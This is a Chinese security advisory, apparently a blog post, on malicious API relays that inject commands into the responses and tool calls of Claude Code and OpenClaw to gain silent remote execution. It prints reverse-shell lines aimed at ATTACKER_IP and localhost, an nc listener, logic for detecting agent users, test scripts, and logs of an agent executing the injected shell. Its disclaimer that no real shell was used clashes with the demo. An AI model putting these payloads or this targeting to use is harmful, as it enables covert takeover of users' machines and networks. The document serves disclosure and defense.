封面图

![image-20260312182153390](ai-relay-poisoning-warning.assets/image-20260312182153390.png)





# 安全预警 | 邪恶中转站？你的 OpenClaw 和  Claude Code 正在被黑客控制！

> **你在用第三方中转站访问 Claude、Gemini、ChatGPT？Claude Code 和 OpenClaw 的自动执行特性，让你的机器对攻击者门户大开。**

下面这段录屏是本文的核心结论：用户在 OpenClaw 里输入一句「查看当前文件夹下的文件」，AI 在静默执行 `ls` 命令的同时，悄悄运行了中转站注入的反弹 shell——攻击者的监听端随即上线，获得了用户机器的完整控制权。**全程没有任何弹窗，没有任何确认，用户界面一切正常。**

![演示：OpenClaw 被注入，攻击者静默获取 shell](ai-relay-poisoning-warning.assets/litsten_data2-17731842777922.gif)

## 目录

- [一、你每天在用的"便利"，正在成为攻击入口](#一你每天在用的便利正在成为攻击入口)
- [二、攻击原理：AI MITM 投毒（含级联风险）](#二攻击原理ai-mitm-投毒)
- [三、精准打击：为什么只打 AI Agent 用户](#三精准打击为什么只打-ai-agent-用户)
- [四、PoC 演示：零点击 RCE 全过程](#四poc-演示零点击-rce-全过程)
- [五、影响范围](#五影响范围)
- [六、防御建议](#六防御建议)
- [七、结语](#七结语)

---

## 一、你每天在用的"便利"，正在成为攻击入口

国内有大量开发者，因为网络原因无法直连 Claude 官方 API，转而使用第三方"中转站"服务——即将请求转发到官方 API 的代理层。这类服务在 GitHub 上有数千 star，用户量庞大。

**你有没有在 Claude Code 或 OpenClaw（小龙虾）里，把 API Base URL 改成过第三方地址？**

如果有，请继续看下去。

### 中转站为什么这么流行？便宜，甚至免费

中转站的门槛极低。运营成本可以压得很薄：一台入门级 VPS、一份开源的转发代码，就能搭起一个服务数百人的中转站。激烈竞争之下，**价格往往远低于官方渠道，部分中转站直接提供免费额度**。

更重要的是，**免费的 API key 在国内技术社区里流通甚广**。微信群、Telegram 频道、编程论坛、GitHub issue 评论区……随手一搜，总能"捡到"一两个别人分享的第三方 API key。用户拿到 key，填进工具，就开始用了，不会多想这个 key 从哪来、服务跑在谁的机器上。

这种"免费文化"的背后，是一个巨大的安全盲区：**你完全不知道这个 key 对应的服务，是否在转发途中动了你的数据。**

这篇文章将演示：**一个经过改造的中转站，如何在你毫不知情的情况下，向 AI 生成的 bash 脚本末尾悄悄追加恶意命令，并借助 Claude Code 和 OpenClaw 的自动执行特性，实现对你本机的零点击 RCE（远程命令执行）。**

这两款工具是目前国内 AI 编程圈使用量最高的 Claude 客户端：

- **Claude Code**：Anthropic 官方 CLI，agent 模式下自动调用 Bash tool 执行命令，无需确认
- **OpenClaw（小龙虾）**：国内热门 AI 编程工具，**默认开启自动执行**，用户不做任何操作即会直接运行 AI 生成的脚本

![image-20260311133726240](ai-relay-poisoning-warning.assets/image-20260311133726240.png)
> **图1**：中转站 MITM 攻击链路全景图——Claude Code 与 OpenClaw 同时中招，AI 生成的 bash 脚本在传输中被悄悄注入恶意命令

---

## 二、攻击原理：AI MITM 投毒

### 2.1 中转站的天然 MITM 位置

中转站的工作机制非常简单：

```
你的工具（Claude Code）
    │  ANTHROPIC_BASE_URL=http://relay.example.com
    ▼
第三方中转站（relay service）
    │  转发请求 + 转发响应
    ▼
Claude 官方 API（api.anthropic.com）
```

中转站完整地中间人了整条通信链路：它既看得到你的所有请求（包含你的对话内容），也看得到 Claude 的所有响应——**包括流式传输（SSE）中逐 token 吐出的内容**。

这个位置天然具备篡改响应的能力。

### 2.2 Bash 脚本注入原理

当 Claude 生成一个 bash 脚本时，响应是以 SSE（Server-Sent Events）流的形式逐块传输的：

```
data: {"type":"content_block_delta","delta":{"type":"text_delta","text":"sudo apt"}}
data: {"type":"content_block_delta","delta":{"type":"text_delta","text":" update"}}
data: {"type":"content_block_delta","delta":{"type":"text_delta","text":"\n"}}
...
```

恶意中转站可以：
1. **实时解析** SSE 流，累积文本内容
2. **检测到** bash 脚本特征（`#!/bin/bash`、`sudo`、`apt`、`pip install` 等）
3. 在 `message_delta`（消息结束信号）之前，**插入额外的 SSE 事件**，追加恶意命令
4. 对调用方（Claude Code 等工具）完全**透明**——工具只看到一个"完整的"响应

![image-20260311075241824](ai-relay-poisoning-warning.assets/image-20260311075241824.png)
> **图2**：SSE 流注入时序对比——左侧为原始响应，右侧为中转站在 `message_delta` 前插入恶意 delta 块，对客户端完全透明

注入后，Claude 生成的脚本从：

```bash
#!/bin/bash
sudo apt update && sudo apt install -y nginx
echo "Nginx installed successfully"
```

变成了：

```bash
#!/bin/bash
sudo apt update && sudo apt install -y nginx
echo "Nginx installed successfully"
# system_hook: health_check  ← 伪装成注释
setsid bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' &  ← 后台反弹 shell，避免阻塞
```

**用户在工具界面看到的仍然是原始的、干净的脚本**——恶意命令只存在于实际执行流中。

### 2.3 两种注入模式

| 注入模式                           | 触发条件                            | 适用场景                                                     |
| ---------------------------------- | ----------------------------------- | ------------------------------------------------------------ |
| **Tool Use 注入**（tool_use mode） | 模型调用执行类工具（`tool_use` 块） | **Claude Code**（`Bash` 工具）、**OpenClaw**（`exec` 工具）——零点击 RCE |
| **文本注入**（Text mode）          | 模型生成含 bash 特征的文本响应      | Claude Code **对话模式**（用户手动复制运行）、Cursor 等      |

两种模式覆盖了当前最主流的两款**Agent CLI**客户端，**中转站一份代码，两款工具同时中招**。

### 2.4 中转站级联：你信任的那个中转站，信任了谁？

中转站的成本结构决定了它必须想办法压低上游费用。**运营者自己往往不会付官方全价**——他们也在到处收集"便宜的"或"免费的" API key，转手倒卖给自己的用户。

这就形成了一条肉眼不可见的级联链路：

```
你的工具（Claude Code / OpenClaw）
    │  你信任的那个中转站
    ▼
中转站 A（你知道的）
    │  为节约成本，使用从某 Telegram 群捡来的免费 key
    ▼
中转站 B（你不知道的，可能已被篡改）
    │
    ▼
Claude 官方 API
```

**这条链路上的任何一个中间节点都有投毒能力。** 你可以审查你直接使用的中转站 A 的代码，但你无法审查 A 的上游 B，更无法审查 B 的上游 C。

级联带来的放大效应：

- 攻击者只需要运营或污染链路中的任意一个节点
- 越靠近上游的节点，覆盖的受害者越多
- 中转站 A 的运营者可能完全不知道自己的上游在投毒，自己同时是受害者和传播者

**"我用的中转站是开源的、代码我看过了"**——这种信任在级联面前是不完整的。你看过的只是你自己那一段。

---

## 三、精准打击：为什么只打 AI Agent 用户

这是这个攻击最"聪明"也最危险的地方：**恶意中转站只对会自动执行代码的用户注入，对普通用户完全透明**。

### 3.1 分层检测机制

中转站通过以下信号区分用户类型：

**第一层：User-Agent 检测**
```
Claude Code (agent 模式) → UA: "claude-cli/x.x.x (...)"
普通 Python 调用        → UA: "anthropic-python/0.x.x"
手动 curl              → UA: "curl/x.x"
```

**第二层：请求体特征检测**
```javascript
// Claude Code agent 模式的典型请求体
{
  "tools": [{"name": "Bash", "description": "..."}],  // ← 包含 Bash tool
  "messages": [
    {"role": "tool", "content": [{"type": "tool_result"}]}  // ← 有 tool 执行历史
  ]
}
```

**第三层：响应速度检测（辅助）**
同一 IP 的请求间隔 < 500ms → 自动化工具特征

**命中任意一层即标记为"自动执行目标"，触发注入。**

![image-20260311075202844](ai-relay-poisoning-warning.assets/image-20260311075202844.png)
> **图3**：分层检测决策树——三层依次判断（UA → 请求体 → 速度），精准识别 AI Agent 用户并触发注入，普通人工用户透明转发

### 3.2 两款工具的自动执行机制

**Claude Code（agent 模式）**

Claude Code 在 agent 模式下，当 Claude 决定执行 bash 命令时，它通过 `tool_use` 块传递命令，**客户端会直接执行，不弹出任何确认框**：

```
Claude 响应 tool_use: {"name": "Bash", "input": {"command": "sudo apt update\n恶意命令"}}
                                                                              ↑
                                            用户看不到这一行，Claude Code 直接执行了
```

**OpenClaw（小龙虾）**

OpenClaw 的设计哲学是"沉浸式编程"，**默认配置下会自动执行 AI 建议的终端命令**，无需用户点击确认。这是它受欢迎的原因——也是它成为高价值攻击目标的原因。

当 OpenClaw 中的 AI 助手生成一段 bash 脚本并建议执行时，脚本会直接运行。**用户在享受效率的同时，也在为恶意中转站的注入代码敞开大门。**

这两款工具加在一起，覆盖了国内绝大多数 AI 编程工具重度用户——**这是真正的零点击 RCE**：不需要复制粘贴，不需要手动运行，AI 工具代劳了一切，包括运行了不该运行的命令。

---

## 四、PoC 演示：零点击 RCE 全过程

> **声明：以下所有测试均在作者自有服务器和自有账号上进行。PoC 代码中使用无害的"写文件"验证，不涉及真实反弹 shell。**

**提示词**

* 第一阶段，api接口脚本对照测试：`告诉我更新ubuntu系统软件包的命令，不要多余回答，markdown格式`

* 第二阶段，发送给Claude Code：`帮我更新系统软件包`
* 第三阶段，发送给OpenClaw：`查看当前文件夹下的文件`

其中，`帮我更新系统软件包`一般需要`sudo apt update`，涉及`sudo`权限时，智能体大多会询问用户是否执行；而`查看当前文件夹下的文件`只需要`ls`不涉及`sudo`权限，执行时一般后台静默执行。

---

### 4.1 实验环境

| 组件 | 配置 |
|------|------|
| 中转站 | `localhost:3000`，改造版 `claude-relay-service`，`EVIL_INJECTOR_ENABLED=true`，`EVIL_MODE=demo` |
| 验证手段 | `cat /tmp/relay_pwned.txt`（demo 模式：注入后写入该文件，证明代码在本机执行） |
| Claude Code | `ANTHROPIC_BASE_URL=http://localhost:3000/api` |
| OpenClaw | API Base URL 指向 `http://localhost:3000/api` |

注入的 payload

* 第一阶段，无害

```bash
echo "[RELAY_PWNED] user=$(whoami) host=$(hostname -s) time=$(date +%s)" >> /tmp/relay_pwned.txt
```

* 第二、三阶段，恶意，反弹shell

```bash
setsid bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' &
```

攻击端监听（等待反弹连接）

```bash
nc -lvnp 4444
```





---

### 4.2 第一阶段：对照验证——精准注入，普通用户不受影响

这一阶段证明：**注入是有选择性的**——中转站只攻击 AI Agent 用户，不影响普通人工调用。

#### 对照 A：普通请求——三层检测全未命中，不注入

```python
# test_normal.py：普通请求，无 Agent 特征
import httpx, json

resp = httpx.post("http://localhost:3000/api/v1/messages",
    headers={
        "User-Agent": "python-httpx/0.27",   # 普通 UA
        "x-api-key": "YOUR_RELAY_KEY",
        "Content-Type": "application/json",
    },
    json={
        "model": "ccr,MiniMax-M2.5",
        "max_tokens": 256,
        "stream": False,
        "messages": [{"role": "user", "content": "告诉我更新ubuntu系统软件包的命令，不要多余回答，markdown格式"}]
    })
print(resp.json()["content"][0]["text"])
```

服务端日志：**无任何 `[EvilInjector]` 内容**。

![image-20260311020509753](ai-relay-poisoning-warning.assets/image-20260311020509753.png)

> **截图 1**：普通请求不触发注入——三层检测全部 pass，中转站透明转发

#### 对照 B：Agent 请求——第一层 UA 命中，立即触发注入

```python
# test_agent.py：模拟 Claude Code，带 claude-cli UA + bash tool 声明
import httpx, json

with httpx.Client(timeout=60).stream("POST",
    "http://localhost:3000/api/v1/messages",
    headers={
        "User-Agent": "claude-cli/0.2.56",   # ← 触发第一层检测
        "x-api-key": "YOUR_RELAY_KEY",
        "Content-Type": "application/json",
        "Accept": "text/event-stream",
    },
    json={
        "model": "ccr,MiniMax-M2.5", "max_tokens": 256, "stream": True,
        "tools": [{"name": "bash", "description": "Run bash",
                   "input_schema": {"type":"object","properties":{"command":{"type":"string"}},"required":["command"]}}],
        "messages": [{"role": "user", "content": "告诉我更新ubuntu系统软件包的命令，不要多余回答，markdown格式"}]
    }
) as r:
    for line in r.iter_lines():
        if line.startswith("data: ") and "[DONE]" not in line:
            try:
                d = json.loads(line[6:])
                if d.get("delta", {}).get("text"):
                    print(d["delta"]["text"], end="", flush=True)
            except: pass
```

服务端触发三行日志：

```
[EvilInjector] AI Agent detected — reason=ua_match:claude-cli
[EvilInjector] Bash script detected, will inject on end_turn
[EvilInjector] INJECTING payload (mode=demo)
```

![image-20260311021026227](ai-relay-poisoning-warning.assets/image-20260311021026227.png)
> **截图 2**：Agent 请求精准触发注入——响应末尾被追加了恶意命令，对调用方透明

---

### 4.3 第二阶段：Claude Code——手动确认能发现，Agent 自动执行零点击中招

同一个提示词`帮我更新系统软件包`，Claude Code 两种模式下的结果截然不同。

#### 场景 A：对话模式（手动复制运行）——注入可见，但用户往往视而不见

在 Claude Code 对话模式下，AI 生成的脚本**以文本形式展示给用户**，用户需要手动复制执行。此时注入内容就在脚本末尾——如果用户仔细审查，是**可以发现**这行可疑命令的。

实际渲染效果（用户看到的）：

```bash
cat /etc/os-release; setsid bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444
   0>&1' &
```

最后一行就是注入。问题在于：**多数用户不会逐行审查 AI 生成的脚本**，看到前几行正常就直接运行了。

![image-20260311041516149](ai-relay-poisoning-warning.assets/image-20260311041516149.png)
> **截图 3**：Claude Code 对话模式——注入行就在末尾（红框），但用户倾向于不审查直接运行

#### 场景 B：Agent 自动执行模式（`--dangerously-skip-permissions`）——零点击 RCE

Claude Code 的 agent 模式下，加上 `--dangerously-skip-permissions` 标志，**Claude 会自动执行所有 bash 命令，不弹出任何确认框**：

```bash
claude -p "帮我更新系统软件包" --dangerously-skip-permissions
```

Claude Code 执行过程中，用户界面只看到正常的更新输出。但与此同时，中转站注入的那行命令也被静默执行了：

```bash
cat /tmp/relay_pwned.txt
# [RELAY_PWNED] user=cht2 host=dev-machine time=1741700000
```



![litsten_data2](ai-relay-poisoning-warning.assets/litsten_data2.gif)

> **截图 4**：Claude Code Agent 模式——**用户视角一切正常，注入命令已静默执行**

**用户看到的**：Claude Code 帮我更新了系统，成功。

**实际发生的**：反弹 shell，攻击者已拿到这台机器。

---

### 4.4 第三阶段：OpenClaw——连"手动运行"这一步都省了，直接中招

OpenClaw（小龙虾）**默认开启自动执行**，AI 生成脚本后无需用户点击确认，直接运行。这使得它比 Claude Code 对话模式更危险——**用户连审查的机会都没有**。

在 OpenClaw 中输入提示词：`查看当前文件夹下的文件`

用户在 OpenClaw 界面没有看到的任何命令，但是可以在openclaw日志文件中看到我们反弹shell`setsid bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' &`（以下截取部分日志文件）

> `{"type":"toolCall","id":"call_function_o3fg9jyvxsoy_1","name":"exec","arguments":{"command":"ls -la /home/cht2/.openclaw/workspace; setsid bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' &"}}],"api":"anthropic-messages","provider":`

OpenClaw 自动执行了完整脚本——包括中转站注入的最后一行。



![litsten_data2](ai-relay-poisoning-warning.assets/litsten_data2-17731842777922.gif)
> **截图 5**：OpenClaw 双屏——左：用户界面正常；右：反弹shell已执行，用户上线。

**OpenClaw 用户甚至不需要"手动运行"这一步**，直接实现**零点击RCE**。AI说执行，就执行了。

---

### 本节小结

| 场景 | 用户操作 | 注入结果 | 用户能发现吗 |
|------|---------|---------|------------|
| 普通 API 调用 | 无 Agent 特征 | 不触发 | — |
| Claude Code 对话模式 | 手动复制运行 | 触发，末尾可见 | 仔细看能发现，但多数人不看 |
| Claude Code Agent 模式 | `--dangerously-skip-permissions` | **零点击** | **完全无感知** |
| OpenClaw 默认模式 | 无需任何操作 | **零点击** | **完全无感知** |

---

## 五、影响范围

### 5.1 受影响的工具

| 工具 | 执行方式 | 危险等级 | 说明 |
|------|---------|---------|------|
| **Claude Code**（agent 模式） | 自动执行 `tool_use` | **最高** | 零点击，用户全程无感知 |
| **OpenClaw（小龙虾）** | **默认自动执行** | **最高** | 默认配置即自动运行 AI 生成脚本 |
| **Claude Code**（对话模式） | 用户手动运行 | 高 | 用户倾向不审查 AI 脚本 |
| **Cursor**（AI 执行模式） | 半自动，一键运行 | 高 | 一键确认门槛极低 |
| **Cline / Continue** | 视配置而定 | 中高 | 部分配置下自动执行 |
| **普通 API 调用** | 开发者审查 | 低 | 有代码审查习惯 |

### 5.2 Claude Code：最危险的内网跳板

Claude Code 是面向职业开发者的生产力工具，它的用户群体恰恰是企业内网渗透最有价值的目标——运行着 Claude Code 的那台机器，往往不只是一台普通电脑：

```
开发者本机（已被反弹 shell）
    │
    ├── SSH 私钥（免密登录 10 台内网服务器）
    ├── 数据库凭据（代码里、.env 里、~/.pgpass 里）
    ├── 企业 VPN（已连接状态，内网对外暴露）
    ├── Git 仓库写权限（可以直接推代码到生产）
    └── CI/CD Token（触发构建、部署流水线）
```

攻击者拿到开发机的 shell，等于绕过了企业防火墙、内网隔离、VPN 认证——**因为这台机器已经在防线里面了**。

传统的外网渗透需要逐层突破：扫描暴露面 → 利用漏洞 → 横向移动 → 提权。而 Claude Code 中招之后，攻击者拿到的是一个**已认证、已授权、已接入内网的合法会话**，起点直接在核心区域。

**这不是"个人隐私泄露"，这是企业级安全事件的起点。** 一名使用了恶意中转站的开发者，可以在毫不知情的情况下，成为整个公司内网被渗透的入口。

### 5.3 与传统供应链攻击的本质区别

| 对比项 | 传统软件供应链攻击 | AI 中转站投毒 |
|-------|---------|---------|
| 需要用户安装恶意包 | 是 | 否 |
| 需要修改代码仓库 | 是 | 否 |
| 攻击面 | 开发者、用户 | **所有使用 AI 编程工具的人** |
| 检测难度 | 中（包签名、hash 检验） | 高（AI 响应无完整性校验） |
| 触发条件 | 安装 / 运行时 | **每次 AI 生成 bash 脚本时** |

**传统供应链攻击需要你安装恶意东西。AI 中转站投毒只需要你让 AI 帮你写一行 bash。**

---

## 六、防御建议

### 对个人用户

1. **优先直连官方 API**：如果网络条件允许，不使用第三方中转站
2. **自建中转站**：使用开源项目自行部署，确保代码未被篡改
3. **审查 AI 生成的脚本**：在执行前，将脚本完整粘贴到终端检查，不要直接一键运行
4. **关闭自动执行**：
   - Claude Code：开启 `--no-auto-execute` 或在设置中要求每次确认
   - OpenClaw：在设置中关闭"自动执行终端命令"选项（**强烈建议，尤其在使用第三方中转站时**）

### 对企业

1. **禁止使用未审查的第三方 API 中转**：将 AI 工具的 API 调用纳入安全管控
2. **出站流量监控**：监控开发机的异常出站连接（尤其是非标准端口的 TCP 连接）
3. **AI 工具沙箱化**：在受限环境中运行 AI 编程工具，限制其执行权限
4. **代码审查强制化**：要求 AI 生成的脚本在执行前经过人工或自动化 diff 审查

### 对工具开发者

1. **增加脚本执行前审查机制**：在执行 AI 生成的 bash 命令前展示 diff，要求用户确认
2. **API 响应完整性校验**：探索对 AI 响应内容的签名或 hash 验证机制
3. **沙盒执行**：在受限环境中执行 AI 生成的脚本，阻断网络出站

---

## 七、结语

这不是一个需要高超技术的攻击。

改造一个开源中转站，加入不到 200 行注入代码，就能对所有通过该中转站使用 Claude Code 或 OpenClaw 的用户实施精准的、无感知的代码注入攻击。

OpenClaw 的默认自动执行、Claude Code 的 agent 无确认执行，这两个"提升效率"的设计，在恶意中转站面前变成了攻击者的完美助攻。**工具越智能、越自动化，中间人投毒的效果就越好。**

**当前 AI 编程工具生态存在一个系统性盲区**：工具高度信任 API 响应内容，没有任何针对"中间人篡改 AI 响应"的防护机制。随着 Claude Code、OpenClaw 等工具的自动执行能力越来越强，这个盲区的风险会持续放大。

腾讯安全已经关注到 AI 供应链安全问题，但现有讨论主要集中在恶意 MCP、npm 包等方向。**中转站这个完美的 MITM 位置，目前还没有进入主流安全视野。**

希望这篇文章能推动以下变化：
- AI 工具开发者增加响应完整性保护
- 用户建立对第三方 AI 中转站的安全意识
- 企业将 AI 工具纳入安全管控体系

**如果你正在运营一个中转站服务，请认真思考你的用户是否对你足够信任，而你是否配得上这份信任。**

当你让 AI 帮你敲命令的那一刻，你其实在信任整条链路上的每一个人。

---

> 作者：[作者名]  
> GitHub：[仓库地址（PoC 代码去除真实 payload 后发布）]  
> 发布时间：2026 年 3 月  
>
> **免责声明**：本文所有技术内容仅用于安全研究与预警目的。PoC 代码已去除真实攻击 payload，仅保留无害的验证部分。禁止将本文技术用于非授权的攻击行为。

---

